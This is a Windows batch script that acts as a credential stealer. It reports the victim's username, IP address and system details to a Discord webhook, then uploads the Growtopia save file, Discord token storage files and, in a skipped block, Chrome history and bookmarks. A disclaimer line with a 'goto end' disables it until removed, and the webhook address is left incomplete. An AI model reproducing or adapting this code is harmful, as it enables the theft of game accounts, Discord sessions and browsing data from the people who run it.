@echo off
:: BY REMOVING THE LINE 3 YOU AGREE TO NOT USE THE SCRIPT FOR MALICIOUS PURPOSES. THE AUTHOR OF THIS SCRIPT IS NOT RESPONSIBLE FOR ANY HARM CAUSED BY THE SCRIPT.
goto end
set "webhook=https://discord.com/api/webhooks/"

for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a

for /f "delims=" %%x in ('ver') do set os = %%x

:: START REPORT
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[INFECTED FILE RAN - %USERNAME%/%NetworkIP%] \n%result% \n%os%\n%PROCESSOR_ARCHITECTURE%```\"}"  %webhook%

:: GROWTOPIA
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` - GROWTOPIA -```\"}"  %webhook%
curl --silent --output /dev/null -F save.dat=@%localappdata%\Growtopia\save.dat %webhook%

:: CHROME
goto skipchrome
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- CHROME -```\"}"  %webhook%
curl --silent --output /dev/null -F History=@%localappdata%\Google\Chrome"\User Data"\Default\History %webhook%
curl --silent --output /dev/null -F Shortcuts=@%localappdata%\Google\Chrome"\User Data"\Default\Shortcuts %webhook%
curl --silent --output /dev/null -F Bookmarks=@%localappdata%\Google\Chrome"\User Data"\Default\Bookmarks %webhook%
:skipchrome

:: DISCORD
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- DISCORD -```\"}"  %webhook%
for /f %%f in ('dir /b %appdata%\discord"\Local Storage"\leveldb\') do (
echo %%f|find ".ldb" >nul
if errorlevel 1 (@echo off) else (curl --silent --output /dev/null -F token.ldb=@%appdata%\discord"\Local Storage"\leveldb\%%f %webhook%)
)

:: END REPORT
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```--- [END OF REPORT] ---```\"}"  %webhook%

:end
exit
